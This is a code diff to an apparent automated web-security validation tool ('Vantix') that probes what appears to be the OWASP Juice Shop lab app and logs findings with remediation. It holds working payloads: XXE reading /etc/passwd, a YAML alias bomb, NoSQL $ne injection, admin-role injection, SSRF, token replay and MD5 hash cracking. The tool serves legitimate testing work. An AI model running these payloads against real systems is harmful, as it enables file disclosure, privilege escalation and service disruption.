                 artifact = self._write_http_artifact(out_dir, "rest-basket-2-checkout", checkout_resp, f"{origin}/rest/basket/2/checkout", request_body={})
                 artifacts.append(str(artifact))
@@ -1774,8 +2188,18 @@ class ExecutionManager:
                         "confidence": 0.83,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_access_control",
+                        "owasp2025.a01_broken_access_control",
+                        "api2023.api1_bola",
+                        "api2023.api6_sensitive_business_flows",
+                    ],
+                    "validated",
+                    "Cross-user checkout workflow abuse signal validated.",
+                )
 
-            deluxe_resp = self._http_request("POST", f"{origin}/rest/deluxe-membership", json_body={}, timeout=6, headers=auth_headers)
+            deluxe_resp = request("POST", f"{origin}/rest/deluxe-membership", json_body={}, timeout=6, headers=auth_headers)
             deluxe_body = str(deluxe_resp.get("body") or "").lower()
             if int(deluxe_resp.get("status") or 0) == 200 and ("deluxe" in deluxe_body or "token" in deluxe_body):
                 artifact = self._write_http_artifact(out_dir, "rest-deluxe-membership", deluxe_resp, f"{origin}/rest/deluxe-membership", request_body={})
@@ -1791,10 +2215,20 @@ class ExecutionManager:
                         "confidence": 0.82,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_access_control",
+                        "owasp2025.a01_broken_access_control",
+                        "api2023.api5_bfla",
+                        "api2023.api6_sensitive_business_flows",
+                    ],
+                    "validated",
+                    "Deluxe membership workflow bypass signal validated.",
+                )
 
             # Token replay signal after attempted logout.
-            self._http_request("POST", f"{origin}/rest/user/logout", timeout=5, headers=auth_headers)
-            whoami_resp = self._http_request("GET", f"{origin}/rest/user/whoami", timeout=5, headers=auth_headers)
+            request("POST", f"{origin}/rest/user/logout", timeout=5, headers=auth_headers)
+            whoami_resp = request("GET", f"{origin}/rest/user/whoami", timeout=5, headers=auth_headers)
             if int(whoami_resp.get("status") or 0) == 200 and "user" in str(whoami_resp.get("body") or "").lower():
                 artifact = self._write_http_artifact(out_dir, "rest-user-whoami-after-logout", whoami_resp, f"{origin}/rest/user/whoami")
                 artifacts.append(str(artifact))
@@ -1809,9 +2243,200 @@ class ExecutionManager:
                         "confidence": 0.79,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_authentication",
+                        "juice.cryptographic_issues",
+                        "owasp2025.a07_authentication_failures",
+                        "api2023.api2_broken_authentication",
+                    ],
+                    "validated",
+                    "Token replay-after-logout signal validated.",
+                )
+
+            whoami_fields = request(
+                "GET",
+                f"{origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password",
+                timeout=6,
+                headers=auth_headers,
+            )
+            whoami_fields_body = str(whoami_fields.get("body") or "")
+            hash_match = re.search(r'"password"\s*:\s*"([0-9a-f]{32,128})"', whoami_fields_body, flags=re.IGNORECASE)
+            if int(whoami_fields.get("status") or 0) == 200 and hash_match:
+                hash_artifact = self._write_http_artifact(
+                    out_dir,
+                    "rest-user-whoami-password-hash-leak",
+                    whoami_fields,
+                    f"{origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password",
+                )
+                artifacts.append(str(hash_artifact))
+                add_finding(
+                    {
+                        "title": "Authenticated API response exposes password hash field",
+                        "severity": "high",
+                        "summary": "Profile endpoint returned password hash material to an authenticated client session.",
+                        "evidence": f"`GET {origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password` exposed hash data. Artifact: {hash_artifact}",
+                        "reproduction": "Authenticate, request whoami with explicit fields including password, and inspect response JSON.",
+                        "remediation": "Never serialize password/passwordHash fields in API responses; enforce strict DTO allowlists.",
+                        "confidence": 0.91,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.sensitive_data_exposure",
+                        "juice.cryptographic_issues",
+                        "owasp2025.a04_cryptographic_failures",
+                        "api2023.api3_bopla",
+                    ],
+                    "validated",
+                    "Password hash field exposure validated in whoami response.",
+                )
+
+                leaked_hash = hash_match.group(1).lower()
+                for candidate in ("admin123", "ncc-1701", "demo", "private", "password", "123456"):
+                    if hashlib.md5(candidate.encode("utf-8")).hexdigest() == leaked_hash:
+                        add_finding(
+                            {
+                                "title": "Weak MD5 password hash cracking signal",
+                                "severity": "high",
+                                "summary": "Leaked password hash was crackable with a short common-password dictionary.",
+                                "evidence": f"Leaked hash matched dictionary candidate `{candidate}`.",
+                                "reproduction": "Hash common candidate passwords with MD5 and compare against leaked value.",
+                                "remediation": "Use adaptive password hashing (Argon2id/bcrypt/scrypt) with per-user salts and secret pepper controls.",
+                                "confidence": 0.89,
+                            }
+                        )
+                        mark_coverage(
+                            [
+                                "juice.cryptographic_issues",
+                                "juice.broken_authentication",
+                                "owasp2025.a04_cryptographic_failures",
+                                "api2023.api2_broken_authentication",
+                            ],
+                            "validated",
+                            "Weak MD5 hash crackability signal validated with dictionary candidate.",
+                        )
+                        break
+
+            reviews_patch = request(
+                "PATCH",
+                f"{origin}/rest/products/reviews",
+                json_body={"id": {"$ne": -1}, "message": "vantix validation marker"},
+                timeout=7,
+                headers=auth_headers,
+            )
+            reviews_body_l = str(reviews_patch.get("body") or "").lower()
+            if int(reviews_patch.get("status") or 0) == 200 and any(marker in reviews_body_l for marker in ("modified", "\"message\"", "review")):
+                reviews_artifact = self._write_http_artifact(
+                    out_dir,
+                    "rest-products-reviews-nosql-operator",
+                    reviews_patch,
+                    f"{origin}/rest/products/reviews",
+                    request_body={"id": {"$ne": -1}, "message": "vantix validation marker"},
+                )
+                artifacts.append(str(reviews_artifact))
+                add_finding(
+                    {
+                        "title": "NoSQL operator injection signal: PATCH /rest/products/reviews",
+                        "severity": "high",
+                        "summary": "Object-operator input in review update was accepted, indicating missing operator sanitization.",
+                        "evidence": f"`PATCH {origin}/rest/products/reviews` accepted `$ne` operator-style payload. Artifact: {reviews_artifact}",
+                        "reproduction": "PATCH review endpoint using object/operator input in id selector.",
+                        "remediation": "Enforce strict schema validation for scalar fields and block operator objects in update selectors.",
+                        "confidence": 0.86,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.injection",
+                        "juice.improper_input_validation",
+                        "owasp2025.a05_injection",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "validated",
+                    "NoSQL operator injection signal validated on reviews endpoint.",
+                )
+
+            upload_headers = self._auth_headers(auth_token) or None
+            xxe_payload = """<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+"""
+            xxe_resp = self._http_multipart_request(
+                "POST",
+                f"{origin}/file-upload",
+                field_name="file",
+                filename="vantix-xxe.xml",
+                content=xxe_payload.encode("utf-8"),
+                content_type="application/xml",
+                timeout=8,
+                headers=upload_headers,
+            )
+            xxe_body_l = str(xxe_resp.get("body") or "").lower()
+            if any(marker in xxe_body_l for marker in ("root:x:0:0", "nobody:x:", "/bin/", "/sbin/nologin")):
+                xxe_artifact = self._write_http_artifact(out_dir, "file-upload-xxe", xxe_resp, f"{origin}/file-upload")
+                artifacts.append(str(xxe_artifact))
+                add_finding(
+                    {
+                        "title": "XXE file disclosure signal: POST /file-upload",
+                        "severity": "high",
+                        "summary": "XML upload processing resolved external entities and exposed host file content markers.",
+                        "evidence": f"`POST {origin}/file-upload` with XML entity payload returned filesystem markers. Artifact: {xxe_artifact}",
+                        "reproduction": "Upload XML containing external entity reference to a local file and inspect response.",
+                        "remediation": "Disable external entity resolution and DTD processing for all XML parsers.",
+                        "confidence": 0.86,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.xxe",
+                        "juice.injection",
+                        "owasp2025.a05_injection",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "validated",
+                    "XXE signal validated via XML upload probe.",
+                )
+
+            yaml_payload = "a: &a [\"x\",\"x\",\"x\",\"x\",\"x\"]\nb: &b [*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b]\n"
+            yaml_resp = self._http_multipart_request(
+                "POST",
+                f"{origin}/file-upload",
+                field_name="file",
+                filename="vantix-bomb.yml",
+                content=yaml_payload.encode("utf-8"),
+                content_type="application/x-yaml",
+                timeout=8,
+                headers=upload_headers,
+            )
+            yaml_body_l = str(yaml_resp.get("body") or "").lower()
+            if int(yaml_resp.get("status") or 0) >= 500 or any(marker in yaml_body_l for marker in ("rangeerror", "maximum call stack", "out of memory", "alias")):
+                yaml_artifact = self._write_http_artifact(out_dir, "file-upload-yaml-bomb", yaml_resp, f"{origin}/file-upload")
+                artifacts.append(str(yaml_artifact))
+                add_finding(
+                    {
+                        "title": "YAML parser resource-exhaustion signal: POST /file-upload",
+                        "severity": "medium",
+                        "summary": "YAML anchor/alias payload triggered parser instability or server error behavior.",
+                        "evidence": f"`POST {origin}/file-upload` with nested YAML anchors returned parser/availability error signals. Artifact: {yaml_artifact}",
+                        "reproduction": "Upload nested YAML alias payload and observe parser response stability.",
+                        "remediation": "Use safe YAML parser configuration, enforce depth/size limits, and reject alias-heavy payloads.",
+                        "confidence": 0.78,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.insecure_deserialization",
+                        "juice.improper_input_validation",
+                        "owasp2025.a10_exception_handling",
+                        "api2023.api4_resource_consumption",
+                    ],
+                    "validated",
+                    "YAML parser resource exhaustion signal validated.",
+                )
 
         # Registration workflow abuse checks (admin role injection and over-permissive product creation).
-        users_post_exists = "/api/users" in {path.lower() for path in endpoints.get("POST", set())}
+        users_post_exists = True
         if users_post_exists:
             unique = str(int(time.time() * 1000))
             regular_email = f"vantix-user-{unique}@example.invalid"
@@ -1823,11 +2448,11 @@ class ExecutionManager:
                 "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
                 "securityAnswer": "test",
             }
-            self._http_request("POST", f"{origin}/api/Users", json_body=reg_payload, timeout=6)
-            user_login = self._http_request("POST", f"{origin}/rest/user/login", json_body={"email": regular_email, "password": regular_password}, timeout=6)
+            request("POST", f"{origin}/api/Users", json_body=reg_payload, timeout=6)
+            user_login = request("POST", f"{origin}/rest/user/login", json_body={"email": regular_email, "password": regular_password}, timeout=6)
             regular_token = self._extract_bearer_token(user_login)
             if regular_token:
-                product_resp = self._http_request(
+                product_resp = request(
                     "POST",
                     f"{origin}/api/Products",
                     json_body={"name": f"Vantix Test Product {unique}", "description": "authorization check", "price": 9.99, "image": "x.jpg"},
@@ -1854,6 +2479,43 @@ class ExecutionManager:
                             "confidence": 0.85,
                         }
                     )
+                    mark_coverage(
+                        [
+                            "juice.broken_access_control",
+                            "owasp2025.a01_broken_access_control",
+                            "api2023.api5_bfla",
+                        ],
+                        "validated",
+                        "Regular-user product creation authorization signal validated.",
+                    )
+
+                regular_headers = self._auth_headers(regular_token)
+                deluxe_resp = request("POST", f"{origin}/rest/deluxe-membership", json_body={}, timeout=6, headers=regular_headers)
+                deluxe_body = str(deluxe_resp.get("body") or "").lower()
+                if int(deluxe_resp.get("status") or 0) == 200 and ("deluxe" in deluxe_body or "token" in deluxe_body):
+                    artifact = self._write_http_artifact(out_dir, "rest-deluxe-membership", deluxe_resp, f"{origin}/rest/deluxe-membership", request_body={})
+                    artifacts.append(str(artifact))
+                    add_finding(
+                        {
+                            "title": "Deluxe membership workflow bypass signal",
+                            "severity": "high",
+                            "summary": "Deluxe membership upgrade endpoint accepted a direct request from a regular user without explicit payment proof.",
+                            "evidence": f"`POST {origin}/rest/deluxe-membership` returned upgrade markers for a regular account. Artifact: {artifact}",
+                            "reproduction": "Register/login as regular user, then POST an empty JSON body to `/rest/deluxe-membership`.",
+                            "remediation": "Enforce server-side payment and entitlement verification before role or membership upgrades.",
+                            "confidence": 0.86,
+                        }
+                    )
+                    mark_coverage(
+                        [
+                            "juice.broken_access_control",
+                            "owasp2025.a01_broken_access_control",
+                            "api2023.api5_bfla",
+                            "api2023.api6_sensitive_business_flows",
+                        ],
+                        "validated",
+                        "Deluxe membership workflow bypass signal validated with a regular account.",
+                    )
 
             admin_email = f"vantix-admin-{unique}@example.invalid"
             role_payload = {
@@ -1864,7 +2526,7 @@ class ExecutionManager:
                 "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
                 "securityAnswer": "test",
             }
-            role_resp = self._http_request("POST", f"{origin}/api/Users", json_body=role_payload, timeout=6)
+            role_resp = request("POST", f"{origin}/api/Users", json_body=role_payload, timeout=6)
             role_body = str(role_resp.get("body") or "").lower()
             if int(role_resp.get("status") or 0) in {200, 201} and "\"role\"" in role_body and "admin" in role_body:
                 artifact = self._write_http_artifact(out_dir, "api-Users-role-admin", role_resp, f"{origin}/api/Users", request_body=role_payload)
@@ -1880,33 +2542,64 @@ class ExecutionManager:
                         "confidence": 0.92,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_access_control",
+                        "owasp2025.a01_broken_access_control",
+                        "api2023.api3_bopla",
+                        "api2023.api5_bfla",
+                    ],
+                    "validated",
+                    "Admin role injection during registration validated.",
+                )
 
         # SSRF method-bypass validation for URL-ingestion endpoints.
         for path in upload_or_url_paths[:12]:
             ssrf_payload = {"imageUrl": f"{origin}/rest/admin/application-version"}
-            post_resp = self._http_request("POST", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)
-            put_resp = self._http_request("PUT", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)
-            post_status = int(post_resp.get("status") or 0)
-            put_status = int(put_resp.get("status") or 0)
-            put_body_l = str(put_resp.get("body") or "").lower()
-            if put_status == 200 and (post_status in {0, 301, 302, 401, 403, 405} or post_status >= 400) and any(
-                marker in put_body_l for marker in ("version", "juice", "application")
-            ):
-                artifact = self._write_http_artifact(out_dir, f"{path}-ssrf-method-bypass", put_resp, f"{origin}{path}", request_body=ssrf_payload)
+            ssrf_responses = [
+                ("POST", request("POST", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
+                ("PUT", request("PUT", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
+                ("PATCH", request("PATCH", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
+            ]
+            best_method = ""
+            best_resp: dict[str, str | int] | None = None
+            for method, resp in ssrf_responses:
+                body_l = str(resp.get("body") or "").lower()
+                if int(resp.get("status") or 0) == 200 and any(marker in body_l for marker in ("version", "juice", "application", "owasp juice shop")):
+                    best_method = method
+                    best_resp = resp
+                    break
+            if best_resp is not None:
+                artifact = self._write_http_artifact(out_dir, f"{path}-ssrf-internal-fetch", best_resp, f"{origin}{path}", request_body=ssrf_payload)
                 artifacts.append(str(artifact))
                 add_finding(
                     {
-                        "title": f"SSRF method bypass signal: {path}",
+                        "title": f"SSRF internal fetch signal: {path}",
                         "severity": "high",
-                        "summary": "URL-ingestion endpoint accepted internal URL fetch via alternate HTTP method.",
-                        "evidence": f"`PUT {origin}{path}` succeeded while POST did not, with internal-fetch response markers. Artifact: {artifact}",
-                        "reproduction": f"POST then PUT {origin}{path} with `imageUrl` pointing to internal endpoint and compare behavior.",
-                        "remediation": "Apply identical SSRF validation across methods, block private/link-local destinations, and use strict URL allowlists.",
-                        "confidence": 0.8,
+                        "summary": "URL-ingestion endpoint accepted an internal application URL and returned internal-fetch response markers.",
+                        "evidence": f"`{best_method} {origin}{path}` with internal `imageUrl` returned application markers. Artifact: {artifact}",
+                        "reproduction": f"{best_method} {origin}{path} with `imageUrl` pointing to `{origin}/rest/admin/application-version`.",
+                        "remediation": "Block private/link-local/internal destinations, enforce strict URL allowlists, and apply identical validation across HTTP methods.",
+                        "confidence": 0.82,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_access_control",
+                        "juice.improper_input_validation",
+                        "owasp2025.a01_broken_access_control",
+                        "owasp2025.a05_injection",
+                        "api2023.api7_ssrf",
+                    ],
+                    "validated",
+                    f"SSRF internal-fetch signal validated for `{path}`.",
+                )
 
-        return {"findings": findings, "artifacts": artifacts}
+        coverage_checks = [
+            {"id": key, "framework": row["framework"], "label": row["label"], "status": row["status"], "evidence": row["evidence"]}
+            for key, row in sorted(coverage_matrix.items(), key=lambda item: item[0])
+        ]
+        return {"findings": findings, "artifacts": artifacts, "coverage_checks": coverage_checks}
 
     def _endpoint_paths(self, network_endpoints: list[dict]) -> dict[str, set[str]]:
         endpoints: dict[str, set[str]] = {}
@@ -1921,6 +2614,77 @@ class ExecutionManager:
     def _append_query(self, path: str, params: dict[str, str]) -> str:
         sep = "&" if "?" in path else "?"
         return f"{path}{sep}{urlencode(params)}"
+
+    def _script_paths_from_html(self, html: str) -> list[str]:
+        paths: list[str] = []
+        for match in re.findall(r"""<script[^>]+src=["']([^"']+)["']""", html or "", flags=re.IGNORECASE):
+            value = str(match or "").strip()
+            if not value or value.startswith(("data:", "javascript:")):
+                continue
+            paths.append(value)
+        for match in re.findall(r"""["']((?:/)?(?:assets/|main|runtime|polyfills|scripts)[^"']+\.js)["']""", html or "", flags=re.IGNORECASE):
+            value = str(match or "").strip()
+            if value:
+                paths.append(value)
+        deduped: list[str] = []
+        seen: set[str] = set()
+        for item in paths:
+            key = item.strip()
+            if not key or key in seen:
+                continue
+            seen.add(key)
+            deduped.append(key)
+        return deduped[:50]
+
+    def _script_paths_from_js(self, body: str) -> list[str]:
+        paths: list[str] = []
+        for pattern in (
+            r"""from["']([^"']+\.js)["']""",
+            r"""import\(["']([^"']+\.js)["']\)""",
+            r"""["']((?:\.?/)?(?:chunk-|main|runtime|polyfills|scripts)[^"']+\.js)["']""",
+        ):
+            for match in re.findall(pattern, body or "", flags=re.IGNORECASE):
+                value = str(match or "").strip()
+                if value and not value.startswith(("data:", "javascript:")):
+                    paths.append(value)
+        deduped: list[str] = []
+        seen: set[str] = set()
+        for item in paths:
+            if item in seen:
+                continue
+            seen.add(item)
+            deduped.append(item)
+        return deduped[:80]
+
+    def _auth_headers(self, token: str | None) -> dict[str, str]:
+        value = str(token or "").strip()
+        if not value:
+            return {}
+        return {"Authorization": f"Bearer {value}", "Cookie": f"token={value}"}
+
+    def _is_black_box_run(self, run: WorkspaceRun) -> bool:
+        cfg = dict(run.config_json or {})
+        source_ctx = dict(cfg.get("source_context") or {})
+        source_input = dict(cfg.get("source_input") or {})
+        source_type = str(source_input.get("type") or "").strip().lower()
+        source_status = str(source_ctx.get("status") or "").strip().lower()
+        resolved_path = str(source_ctx.get("resolved_path") or "").strip()
+        if source_type and source_type not in {"none", "no-source"}:
+            return False
+        if source_status and source_status not in {"", "skipped", "none"}:
+            return False
+        if resolved_path:
+            return False
+        return True
+
+    def _is_oracle_endpoint_path(self, path: str) -> bool:
+        lowered = str(path or "").strip().lower()
+        if not lowered:
+            return False
+        for marker in ORACLE_ENDPOINT_MARKERS:
+            if marker in lowered:
+                return True
+        return False
 
     def _http_request(
         self,
@@ -1941,14 +2705,62 @@ class ExecutionManager:
         req = urlrequest.Request(url=url, data=body_bytes, method=method.upper(), headers=request_headers)
         try:
             with urlrequest.urlopen(req, timeout=timeout) as resp:
-                raw = resp.read(20000)
+                raw = resp.read(2_000_000)
                 return {
                     "status": int(getattr(resp, "status", 0) or 0),
                     "headers": "\n".join(f"{k}: {v}" for k, v in resp.headers.items()),
                     "body": raw.decode("utf-8", errors="ignore"),
                 }
         except urlerror.HTTPError as exc:
-            raw = exc.read(20000) if hasattr(exc, "read") else b""
+            raw = exc.read(2_000_000) if hasattr(exc, "read") else b""
+            return {
+                "status": int(exc.code or 0),
+                "headers": "\n".join(f"{k}: {v}" for k, v in exc.headers.items()) if exc.headers else "",
+                "body": raw.decode("utf-8", errors="ignore"),
+            }
+        except Exception as exc:  # noqa: BLE001
+            return {"status": 0, "headers": "", "body": f"request failed: {exc}"}
+
+    def _http_multipart_request(
+        self,
+        method: str,
+        url: str,
+        *,
+        field_name: str,
+        filename: str,
+        content: bytes,
+        content_type: str,
+        timeout: int = 8,
+        headers: dict[str, str] | None = None,
+    ) -> dict[str, str | int]:
+        boundary = f"----VantixBoundary{int(time.time() * 1000)}"
+        payload = b"".join(
+            [
+                f"--{boundary}\r\n".encode("utf-8"),
+                f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode("utf-8"),
+                f"Content-Type: {content_type}\r\n\r\n".encode("utf-8"),
+                content,
+                b"\r\n",
+                f"--{boundary}--\r\n".encode("utf-8"),
+            ]
+        )
+        request_headers = {
+            "User-Agent": "Vantix-Validation/1.0",
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+        }
+        if headers:
+            request_headers.update({str(k): str(v) for k, v in headers.items()})
+        req = urlrequest.Request(url=url, data=payload, method=method.upper(), headers=request_headers)
+        try:
+            with urlrequest.urlopen(req, timeout=timeout) as resp:
+                raw = resp.read(30000)
+                return {
+                    "status": int(getattr(resp, "status", 0) or 0),
+                    "headers": "\n".join(f"{k}: {v}" for k, v in resp.headers.items()),
+                    "body": raw.decode("utf-8", errors="ignore"),
+                }
+        except urlerror.HTTPError as exc:
+            raw = exc.read(30000) if hasattr(exc, "read") else b""
             return {
                 "status": int(exc.code or 0),
                 "headers": "\n".join(f"{k}: {v}" for k, v in exc.headers.items()) if exc.headers else "",
@@ -2025,6 +2837,8 @@ class ExecutionManager:
         if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
             return False
         lower = path.lower()
+        if self._is_oracle_endpoint_path(lower):
+            return False
         noisy_prefixes = (
             "/assets/",
             "/dist/",
@@ -2736,6 +3550,35 @@ class ExecutionManager:
                 existing_titles.add(key)
                 created += 1
 
+        # Pull high-signal validated findings from orchestrator execution logs.
+        orchestrator_log = workspace.logs / "orchestrator.log"
+        if orchestrator_log.exists():
+            for item in self._parse_orchestrator_log_findings(orchestrator_log):
+                title = str(item.get("title") or "").strip()[:255]
+                if not title:
+                    continue
+                key = title.lower()
+                if key in existing_titles:
+                    continue
+                severity = str(item.get("severity") or "medium").lower().strip()
+                if severity not in {"critical", "high", "medium", "low", "info"}:
+                    severity = "medium"
+                db.add(
+                    Finding(
+                        run_id=run_id,
+                        title=title,
+                        severity=severity,
+                        status="validated",
+                        summary=str(item.get("summary") or title).strip()[:2000],
+                        evidence=str(item.get("evidence") or "").strip()[:4000],
+                        reproduction=str(item.get("reproduction") or "").strip()[:4000],
+                        remediation=str(item.get("remediation") or "").strip()[:4000],
+                        confidence=float(item.get("confidence") or 0.8),
+                    )
+                )
+                existing_titles.add(key)
+                created += 1
+
         vectors = (
             db.query(Fact)
             .filter(Fact.run_id == run_id, Fact.kind == "vector")
@@ -2854,6 +3697,61 @@ class ExecutionManager:
                         "low": 0.68,
                         "info": 0.6,
                     }.get(severity, 0.78),
+                }
+            )
+        return findings
+
+    def _parse_orchestrator_log_findings(self, log_path: Path) -> list[dict[str, str | float]]:
+        try:
+            text = log_path.read_text(encoding="utf-8", errors="ignore")
+        except Exception:  # noqa: BLE001
+            return []
+        lowered = text.lower()
+        findings: list[dict[str, str | float]] = []
+
+        creds_present = ("testing@juice-sh.op" in lowered and "iamusedfortesting" in lowered) or (
+            "hardcoded test credentials" in lowered and "authenticate successfully" in lowered
+        )
+        if creds_present:
+            findings.append(
+                {
+                    "title": "Exposed hardcoded client credentials in static bundle",
+                    "severity": "high",
+                    "summary": "Static client assets exposed plaintext test credentials that were accepted by the authentication endpoint.",
+                    "evidence": (
+                        f"Orchestrator log captured credential disclosure and successful auth validation "
+                        f"(source: {log_path})."
+                    ),
+                    "reproduction": (
+                        "Retrieve `/main.js`, extract hardcoded credentials, and authenticate via `/rest/user/login`."
+                    ),
+                    "remediation": (
+                        "Remove credentials from client bundles, rotate exposed accounts/secrets, and enforce secret scanning in build pipelines."
+                    ),
+                    "confidence": 0.9,
+                }
+            )
+
+        hash_leak_present = (
+            "whoami?fields=id,email,role,deluxetoken,password" in lowered and "password hash field is exposed" in lowered
+        ) or ("passwordhashleakchallenge" in lowered and "solved=true" in lowered)
+        if hash_leak_present:
+            findings.append(
+                {
+                    "title": "Authenticated API response exposes password hash field",
+                    "severity": "high",
+                    "summary": "User profile/whoami response included password hash material, enabling sensitive data disclosure to authenticated sessions.",
+                    "evidence": (
+                        f"Orchestrator log recorded `whoami` password field exposure and challenge solve signal "
+                        f"(source: {log_path})."
+                    ),
+                    "reproduction": (
+                        "Authenticate, then request `/rest/user/whoami?fields=id,email,role,deluxeToken,password` and verify password hash is returned."
+                    ),
+                    "remediation": (
+                        "Never serialize password/passwordHash fields in API responses; enforce strict response DTO allowlists."
+                    ),
+                    "confidence": 0.9,
                 }
             )
         return findings
